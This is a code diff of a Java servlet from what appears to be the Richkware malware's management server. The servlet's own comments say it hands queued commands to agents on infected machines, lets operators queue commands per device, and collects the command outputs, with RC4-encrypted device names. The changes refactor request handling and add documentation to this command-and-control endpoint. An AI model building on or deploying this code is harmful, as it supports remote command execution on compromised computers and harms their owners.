@@ -31,53 +31,33 @@ public class command extends HttpServlet {
         password = ResourceBundle.getBundle("configuration").getString("encryptionkey");
     }
 
+    /**
+     * GET
+     * Richkware Agent use this verb to get commands that have to be executed on the
+     * infected machine.
+     * Webapp and RMC use this verb to get command outputs
+     *
+     * @param request
+     * @param response
+     * @throws IOException
+     */
+
     @Override
-    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
-        PrintWriter out = resp.getWriter();
-        HttpSession httpSession = req.getSession();
-        RMSSession rmsSession = null;
-
+    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+        PrintWriter out = response.getWriter();
         try {
+            RMSServletManager rmsServletManager = new RMSServletManager(request, response);
+            // TODO il cookie non deve essere controllato se è un richkware agent, negli altri casi si
+            Map<String, String> attribMap = rmsServletManager.doDefaultProcessRequest(false);
 
-            BufferedReader br = req.getReader();
-            String response = br.readLine();
-
-//            session = ServletManager.getServerSession(httpSession);
-//
-//            JSONObject JSONData = new JSONObject(response);
-//            String deviceName = JSONData.getString("data0");
-//            String requestor = JSONData.getString("data1");
-//
-//
-//            if (deviceName != null && requestor != null) {
-//                String output = null;
-//
-//                if (requestor.equalsIgnoreCase("agent")) {
-//                    output = session.getDeviceDatabaseManager().getCommands(deviceName);
-//                } else if (requestor.equalsIgnoreCase("client")) {
-//                    output = session.getDeviceDatabaseManager().getCommandsOutput(deviceName);
-//                    session.getDeviceDatabaseManager().setCommandsOutput(deviceName, "");
-//                }
-//
-//                if (!output.isEmpty()) {
-//                    out.println((new OkResponse(RMSStatusCode.SUCCESS, output)).json());
-//                } else {
-//                    out.println((new KoResponse(RMSStatusCode.FIELD_EMPTY)).json());
-//                }
-//            }
-//
-//            br.close();
-
-            RMSServletManager rmsServletManager = new RMSServletManager(req,resp);
-            rmsSession = rmsServletManager.getRMSServerSession();
-
-            Map<String, String> attribMap = rmsServletManager.doDefaultProcessRequest();
+            // server session
+            RMSSession rmsSession = rmsServletManager.getRMSServerSession();
 
             String deviceName = attribMap.get("data0");
 
             String output = null;
 
-            if (RMSServletManager.Channel.RICHKWARE.equalsIgnoreCase(req.getParameter("channel"))) {
+            if (RMSServletManager.Channel.RICHKWARE.equalsIgnoreCase(rmsSession.getChannel())) {
                 deviceName = Crypto.decryptRC4(deviceName, password);
                 output = rmsSession.getDeviceDatabaseManager().getCommands(deviceName);
             } else {
@@ -96,6 +76,14 @@ public class command extends HttpServlet {
         }
     }
 
+    /**
+     * PUT
+     * Webapp and RMC upload commands that have to be executed on a specific device
+     *
+     * @param req
+     * @param resp
+     * @throws IOException
+     */
     @Override
     protected void doPut(HttpServletRequest req, HttpServletResponse resp) throws IOException {
         //TODO: gestire richieste per multipli device
@@ -111,7 +99,7 @@ public class command extends HttpServlet {
             JSONArray devicesName = JSONData.getJSONArray("devices");
             String commands = JSONData.getString("commands");
 
-            RMSServletManager rmsServletManager = new RMSServletManager(req,resp);
+            RMSServletManager rmsServletManager = new RMSServletManager(req, resp);
             rmsSession = rmsServletManager.getRMSServerSession();
 
             List<String> failedResponse = new ArrayList<>();
@@ -122,7 +110,7 @@ public class command extends HttpServlet {
             }
 
             if (failedResponse.isEmpty())
-                out.println((new OkResponse(RMSStatusCode.SUCCESS,"commands added.")).json());
+                out.println((new OkResponse(RMSStatusCode.SUCCESS, "commands added.")).json());
             else {
                 out.println((new KoResponse(RMSStatusCode.DB_FIELD_EMPTY, Arrays.toString(failedResponse.toArray()))).json());
             }
@@ -133,43 +121,60 @@ public class command extends HttpServlet {
         }
     }
 
+    /**
+     * POST
+     * Richkware Agent use this verb to upload the command outputs of the command sent before by
+     * webapp or RMC with verb PUT
+     *
+     * @param request
+     * @param response
+     * @throws IOException
+     */
     @Override
-    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
-        PrintWriter out = resp.getWriter();
-        HttpSession httpSession = req.getSession();
-        RMSSession rmsSession = null;
-
+    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
+        PrintWriter out = response.getWriter();
         try {
-            BufferedReader br = req.getReader();
-            String response = br.readLine();
+            RMSServletManager rmsServletManager = new RMSServletManager(request, response);
+            Map<String, String> attribMap = rmsServletManager.doDefaultProcessRequest(false);
 
-            JSONObject JSONData = new JSONObject(response);
-            String deviceName = JSONData.getString("device");
-            String commandsOutput = JSONData.getString("data");
+            // server session
+            RMSSession rmsSession = rmsServletManager.getRMSServerSession();
 
-            //commandsOutput = Crypto.decryptRC4(commandsOutput, password);
-            //commandsOutput= new String(Base64.getUrlDecoder().decode(commandsOutput));
-            // Reverse command output has to be sent to the front end in base64 format
+            // device: deviceID
+            // data: command outputs
+            if (attribMap.containsKey("device") &&
+                    attribMap.containsKey("data") ) {
 
-            RMSServletManager rmsServletManager = new RMSServletManager(req,resp);
-            rmsSession = rmsServletManager.getRMSServerSession();
+                String deviceName = attribMap.get("device");
+                String commandsOutput = attribMap.get("data");
 
-            boolean result = rmsSession.getDeviceDatabaseManager().setCommandsOutput(deviceName, commandsOutput);
-            if (result) {
-                rmsSession.getDeviceDatabaseManager().editCommands(deviceName, "");
-                out.println((new OkResponse(RMSStatusCode.SUCCESS,"editCommands succeeded")).json());
+                //commandsOutput = Crypto.decryptRC4(commandsOutput, password);
+                //commandsOutput= new String(Base64.getUrlDecoder().decode(commandsOutput));
+                // Reverse command output has to be sent to the front end in base64 format
+
+                boolean result = rmsSession.getDeviceDatabaseManager().setCommandsOutput(deviceName, commandsOutput);
+                if (result) {
+                    rmsSession.getDeviceDatabaseManager().editCommands(deviceName, "");
+                    out.println((new OkResponse(RMSStatusCode.SUCCESS, "editCommands succeeded")).json());
+                } else {
+                    out.println((new KoResponse(RMSStatusCode.DB_FIELD_EMPTY, "Field not found in DB")).json());
+                }
             } else {
-                out.println((new KoResponse(RMSStatusCode.DB_FIELD_EMPTY, "Field not found in DB")).json());
+                // argomenti non presenti
+                out.println((new KoResponse(RMSStatusCode.GENERIC_ERROR, "Parameters missing")).json());
             }
-            br.close();
         } catch (JServletException e) {
             out.println(e.getKoResponseJSON());
         } catch (DatabaseException e) {
             out.println((new KoResponse(RMSStatusCode.DB_ERROR, e.getMessage())).json());
-        } catch (Exception e){
+        } catch (Exception e) {
             //e.printStackTrace();
             out.println((new KoResponse(RMSStatusCode.GENERIC_ERROR, e.getMessage())).json());
         }
+
+
+        out.flush();
+        out.close();
     }
 
 }
